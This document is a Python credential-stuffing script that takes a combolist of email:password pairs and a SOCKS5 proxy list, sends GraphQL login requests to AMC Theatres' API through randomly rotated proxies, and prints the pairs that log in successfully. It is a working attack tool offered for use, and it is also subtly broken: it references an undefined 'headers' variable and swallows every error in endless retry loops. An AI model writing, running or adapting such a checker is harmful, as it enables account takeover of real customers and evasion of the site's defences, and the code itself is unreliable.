import requests, json, argparse, random

parser = argparse.ArgumentParser()
parser.add_argument("-i", "--infile", help="Combolist input txt file")
parser.add_argument("-s", "--socks", help="Socks5 proxy txt file")
args = parser.parse_args()

prarr = []
with open(args.socks, "r") as prlist:
    for sprox in prlist:
        sprox = sprox.strip()
        prarr.append(sprox)

with open(args.infile, "r") as combofile:
    for combo in combofile:
        sesh = requests.Session()
        combo = combo.strip()
        carr = combo.split(':')
        login = carr[0]
        pdub = carr[1]
        while True:
            try:
                proxies = {'https': "socks5://" + random.choice(prarr)}
                data = {
                    'operationName':
                    'LoginModal',
                    'variables': {
                        'hasOrder': False,
                        'token': ''
                    },
                    'query':
                    'query LoginModal($token: String!, $hasOrder: Boolean!) {\n  viewer {\n    ...SocialLoginButtons_Viewer\n    order(token: $token) @include(if: $hasOrder) {\n      id\n      token\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment SocialLoginButtons_Viewer on Viewer {\n  accountProviders {\n    clientId\n    provider\n    providerApiToken\n    __typename\n  }\n  __typename\n}\n'
                }
                response = sesh.post(
                    "https://graph.amctheatres.com/",
                    proxies=proxies,
                    json=data,
                    timeout=3)
                break
            except Exception as e:
                #print(e)
                continue
        while True:
            try:
                proxies = {'https': "socks5://" + random.choice(prarr)}
                data = '{"operationName":"userLogin","variables":{"input":{"email":"' + login + '","password":"' + pdub + '"}},"query":"mutation userLogin($input: LoginInput!) {\\n  userLogin(input: $input) {\\n    user {\\n      id\\n      ...featureFlagsFatQuery\\n      account {\\n        id\\n        ...accountFatQuery\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\\nfragment accountFatQuery on Account {\\n  accountId\\n  accountType\\n  displayName\\n  emailAddress\\n  hasProductSubscription\\n  token\\n  __typename\\n}\\n\\nfragment featureFlagsFatQuery on User {\\n  sessionId\\n  account {\\n    accountId\\n    accountType\\n    featureFlagsHash\\n    hasProductSubscription\\n    productSubscription {\\n      id\\n      type\\n      typeCode\\n      __typename\\n    }\\n    __typename\\n  }\\n  __typename\\n}\\n"}'
                #print(proxies,combo)
                response = sesh.post(
                    'https://graph.amctheatres.com/',
                    proxies=proxies,
                    headers=headers,
                    data=data)
                #print (response.content)
                blob = json.loads(response.content)
                if blob['data']['userLogin'] is not None:
                    print(login + ":" + pdub)
            except Exception as e:
                #print(e)
                continue
            break
